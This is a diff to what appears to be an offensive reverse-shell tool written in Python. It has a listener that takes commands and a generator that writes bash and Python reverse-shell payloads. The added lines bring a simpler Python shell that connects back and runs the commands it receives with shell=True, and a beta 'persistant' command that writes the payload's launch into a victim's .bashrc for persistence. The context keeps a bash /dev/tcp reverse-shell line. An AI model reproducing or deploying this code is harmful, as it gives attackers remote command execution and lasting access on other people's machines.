@@ -34,6 +34,9 @@ def listen(ip, port):
             command = input("Shell> ")
             if command.lower() == "exit":
                 break
+            elif command.lower() == "persistant":                         # BETA
+                persistant = r""""echo "python payload.py" > .bashrc """  # BETA
+                client_socket.send(persistant.encode())                   # BETA
 
             client_socket.send(command.encode())
             response = client_socket.recv(4096).decode()
@@ -56,68 +59,30 @@ def option_check(choice):
                 file.write(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
             print("[+] Payload Created")
         elif shell_type == "python":
-            payload = f"""
-            import os,socket,subprocess,threading;
-                def s2p(s, p):
-                    while True:
-                        data = s.recv(1024)
-                        if len(data) > 0:
-                            p.stdin.write(data)
-                            p.stdin.flush()
-
-                def p2s(s, p):
-                    while True:
-                        s.send(p.stdout.read(1))
-
-                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.connect(("{ip}",{port}))
-
-                p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
-
-                s2p_thread = threading.Thread(target=s2p, args=[s, p])
-                s2p_thread.daemon = True
-                s2p_thread.start()
-
-                p2s_thread = threading.Thread(target=p2s, args=[s, p])
-                p2s_thread.daemon = True
-                p2s_thread.start()
-
-                try:
-                    p.wait()
-                except KeyboardInterrupt:
-                    s.close()
-            """
             with open("payload.py", "w") as file:
                 file.write(f"""
-                import os,socket,subprocess,threading;
-                    def s2p(s, p):
-                        while True:
-                            data = s.recv(1024)
-                            if len(data) > 0:
-                                p.stdin.write(data)
-                                p.stdin.flush()
+import socket
+import subprocess
 
-                    def p2s(s, p):
-                        while True:
-                            s.send(p.stdout.read(1))
+def connect_to_listener():
+    server_ip = "{ip}"
+    server_port = {port}
+    
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((server_ip, server_port))
+    
+    while True:
+        command = client_socket.recv(1024).decode('utf-8')
+        if command.lower() == 'exit':
+            break
+        output = subprocess.run(command, shell=True, capture_output=True)
+        response = output.stdout + output.stderr
+        client_socket.send(response)
+        
+    client_socket.close()
 
-                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                    s.connect(("{ip}",{port}))
-
-                    p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
-
-                    s2p_thread = threading.Thread(target=s2p, args=[s, p])
-                    s2p_thread.daemon = True
-                    s2p_thread.start()
-
-                    p2s_thread = threading.Thread(target=p2s, args=[s, p])
-                    p2s_thread.daemon = True
-                    p2s_thread.start()
-
-                    try:
-                        p.wait()
-                    except KeyboardInterrupt:
-                        s.close()
+if __name__ == "__main__":
+    connect_to_listener()
     """)
         else:
             print("[!] Unknown shell type.")
@@ -171,5 +136,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
